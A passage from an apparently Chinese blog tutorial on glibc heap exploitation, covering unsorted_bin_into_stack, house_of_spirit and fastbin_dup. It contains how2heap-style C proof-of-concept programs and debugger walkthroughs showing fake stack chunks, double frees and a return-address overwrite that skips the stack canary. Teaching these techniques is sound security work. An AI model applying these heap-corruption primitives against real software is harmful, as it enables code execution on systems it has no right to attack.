<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04进行编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>首先申请了两个堆块，第一个堆块不属于fastbin大小，先进入unsortedbin中，第二个堆块为了防止第一块堆块与topchunk合并。在free第一个堆块前设置断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CHJZNE3YDAFDZMS.png"
                     
                ><br>查看bins和heap信息<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CKURHWFQTKVYSZ4.png"
                     
                ><br>free第一个chunk以后，bins和heap信息，unsortedbin里的第一个chunk的fd和bk指向main_arena+0x58的位置。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_E396T5K2YSZR35Q.png"
                     
                ><br>接下来利用uaf将unsortedbin中的第一个chunk的bk指针（rax存储的指针指向fd,rax+8指向bk,bk指向后加入的chunk）指向StackVar的prev_size位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_UC93S5J8Q2CNP72.png"
                     
                ><br>在0x4007D9处下断点，查看heap和bins信息。可以看到，0x602000处的chunk的bk指针被改为了一个栈值，fd指向main_arena+0x58的位置。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922101848230.png"
                      alt="image-20230922101848230"
                ><br>再次将unsortedbin中第一个chunk给malloc出来以后，unsortedbin中仅剩StackVar-0x10。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_ZJY9Q5VVBT68CZ3.png"
                     
                ><br>在0x400828下断点。查看heap和bins信息。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Z4EUWZVH32R7NCC.png"
                     
                ><br>可以看到，StackVar的fd指针即用户区域起始处已被修改为main_arena+0x58的值。</p>
<h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted_bin_into_stack"></a>unsorted_bin_into_stack</h2><p><code>glibc &lt; 2.29</code></p>
<h3 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);</span><br><span class="line">	<span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">	stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">	stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);</span><br><span class="line">	victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">	victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">	<span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">	<span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">	<span class="built_in">memcpy</span>((p2+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><p>首先申请两个堆块<br>第一次申请的0x100大小的堆块给了[rbp+ptr]。第二个0x100是阻断topchunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_SKW8ZP7TMRGT4KH.png"
                     
                ><br>接下来free(ptr)，把ptr放入unsorted bin中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_M9SHEHDCSMPZBD7.png"
                     
                ><br>在0x4007A7其fd，bk指向main_arena+x58的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2PFN7JA5YKTQ3WJ.png"
                     
                ><br>这里把var_28位置写为0x110。IDA里这个var_28中的0x28是16进制的偏移。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XUU37A7TTNM9CTE.png"
                     
                ><br>这里把rax指向ptr-8的位置，特就是size处。然后将其改为0x20。unsorted bin有FIFO特性，下次申请0x100大小不会找到它。然后将ptr+8的位置指向var_30，也就是把ptr的bk指针指向var_0x28+0x8的位置（bk指向后进入unsorted bin的chunk），var_0x28&#x3D;0x110，也就是伪造的chunk大小，var_30也就是prev_size的位置。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7FFXHQMZJZJ6VD9.png"
                     
                ><br>在0x40081C下断点，可见ptr的bk指向栈。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_X8QF98YVC2Y7HSR.png"
                     
                ><br>查看0x602410内存可见ptr的size位置被改为了0x20<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_RNY3WYAWYJ7DY93.png"
                     
                ><br>接下来申请0x100大小的chunk将会去unsorted bin寻找0x110大小的chunk，ptr已被改为0x20大小，所以跳过ptr申请到了栈上伪造的var_30处chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4R6P2X9QDR3K5EQ.png"
                     
                ><br>在0x40082B处下断点，可见malloc后，unsorted被整理，0x20大小的ptr放进了small bin。fd和bk都指向main_arena+104处。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CFQPP2ZXM4P7YKJ.png"
                     
                ><br>申请成功。</p>
<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h2><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="built_in">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu16.04编译，然后使用pwncli改写rpath。
</code></pre>
<h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><p>初始化堆。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091755981-1695348432658-25.png"
                      alt="image-20230922091755981"
                ></p>
<p>在<code>0x400703</code>处下断点查看堆结构。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922091916522-1695348571707-28.png"
                     
                ><br>栈中数组结构。<code>fake_chunks_size = 0x40</code>，<code>fake_chunks_next_size = 0x1234</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092146583-1695348610428-32.png"
                      alt="image-20230922092146583"
                ><br>将 <code>a</code> 指向<code>fake_chunks_fd</code>，然后 <code>free(a)</code>。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092342656-1695348634598-36.png"
                      alt="image-20230922092342656"
                ><br>成功将栈地址放入 <code>fastbins</code> 中。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092506302-1695348654255-39.png"
                      alt="image-20230922092506302"
                ><br>那麽此时申请0x30大小的空间会在fastbins中寻找0x40大小的chunk，便可成功申请到栈上。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20230922092715145-1695348671021-42.png"
                      alt="image-20230922092715145"
                ></p>
<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><ul>
<li>fast bin attack<br>例题1：<a class="link"   href="https://www.52pojie.cn/thread-1817311-1-1.html" >0CTF2017:babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>unsafe unlink<br>例题2：<a class="link"   href="https://www.52pojie.cn//thread-1820017-1-1.html" >HITCON CTF 2016 : Secret Holdr <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>例题3：<a class="link"   href="https://www.52pojie.cn/thread-1825577-1-1.html" >HITCON CTF 2016 : SleepyHolder <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><p>使用ubuntu:16.04编译，<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XWR593Z6QWM678A.png"
                     
                ><br>然后使用pwncli修改运行环境。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_HFXM6UD3SRQFGMH.png"
                      alt="图片描述"
                ><br>malloc三次相同大小的堆块后，在0x400700下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2EGACEX74TU3QRY.png"
                      alt="图片描述"
                ><br>观察堆结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_24PJANS2GM8MB2P.png"
                      alt="图片描述"
                ><br>依次释放堆块a,b后，在0x4007CF下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_A2SCWXK32FJK626.png"
                      alt="图片描述"
                ><br>观察fastbin结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_5KFTD8D4QBYUZRY.png"
                      alt="图片描述"
                ><br>再次释放a,形成double free后，在0x4007F8下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JZ24RST96TR5RPJ.png"
                      alt="图片描述"
                ><br>观察fastbin结构，已经形成ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_782YNCGZFNYW8QR.png"
                      alt="图片描述"
                ><br>此时依次申请a,b,c三个相应大小的堆块，将会依次摘出a,b,a,<br>fastbin中a-&gt;b-&gt;a-&gt;b…这条链子会一直存在，不断从头部取出相应大小的堆块。<br>申请a后，在0x400835下断点（rax保存了_malloc函数的返回值）。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QA4NT4K533CQDKZ.png"
                      alt="图片描述"
                ><br>此时fastbin结构，形成了BAB结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YRGPNNXAJD7C2F9.png"
                      alt="图片描述"
                ><br>同样，申请完b后在0x400843下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PTP2U3KSVCT74TK.png"
                      alt="图片描述"
                ><br>此时fastbin结构，又形成了ABA结构。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_J4CQ4CJAZSCH7WU.png"
                      alt="图片描述"
                ><br>同样申请完c后在0x400851下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_CR3CMBC9VJWUDT3.png"
                      alt="图片描述"
